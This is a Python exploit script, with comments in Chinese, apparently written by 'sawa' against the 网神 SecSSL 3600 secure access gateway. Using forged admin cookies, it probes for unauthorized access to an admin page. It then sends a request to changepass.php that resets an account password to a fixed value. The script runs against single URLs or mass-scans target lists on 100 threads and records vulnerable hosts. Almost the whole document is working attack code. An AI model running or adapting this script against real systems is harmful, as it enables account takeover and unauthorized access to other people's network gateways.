#网神 SecSSL 3600 安全接入网关系统 未授权访问 及任意账号密码修改漏洞/admin/group/x_group.php?id=2   /changepass.php?type=2 WS_information_leak_AccpwdChange.py
import requests,re,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()# 解除警告
def banner():
    banner ="""

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░ ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░ ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█  ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█  ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓  ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒   ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░   ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░      ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░     ░    
                                    @author:           sawa
                                    @version:          1.0.0
                                    For:               网神 SecSSL 3600 安全接入网关系统 未授权访问及任意账号密码修改漏洞░                                                     
"""
    print(banner)
def main():
    banner()#调用
    parser = argparse.ArgumentParser(description="this is a 网神 SecSSL 3600 安全接入网关系统 未授权访问 及任意账号密码修改漏洞")#实例化
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')#添加参数
    parser.add_argument('-f','-file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)#多线程
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))

def poc(target):
    payload_url = '/admin/group/x_group.php?id=2'
    url = target+payload_url
    headers = {
        "Cookie": "admin_id=1; gw_admin_ticket=1;",        
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"    
    }
    headers1 = {
        "Cookie":'admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"test","subAuthId":"1"}',        
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
        }
    data = "old_pass=&password=Test123!@&repassword=Test123!@"
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5)
        # match = re.search(r'"/login/login"',res.text)#正则匹配
        if res.status_code == 200 and "本地认证" in res.text:
            print(f"[+]该{target}存在未授权访问漏洞")
            with open('result.txt','a',encoding='utf-8') as fp:
                 fp.write(target+"\n")
        else:
            print(f"[-]该{target}不存在未授权访问漏洞")
    except Exception as e:#异常处理
        print(f"[*]该url存在问题{target},请手动测试",e)
    try:
        res1 = requests.post(url=target+'/changepass.php?type=2' ,headers=headers1,data=data,verify=False,timeout=5)
        if res1.status_code == 200 and "修改密码成功" in res1.text:
            print(f"[+]该{target}存在任意账号密码修改漏洞")
            with open('result1.txt','a',encoding='utf-8') as fp:
                 fp.write(target+"\n")
        else:
            print(f"[-]该{target}不存在任意账号密码修改漏洞")
    except Exception as e:#异常处理
        print(f"[*]该url存在问题{target},请手动测试",e)
        
if __name__ == '__main__':
    main()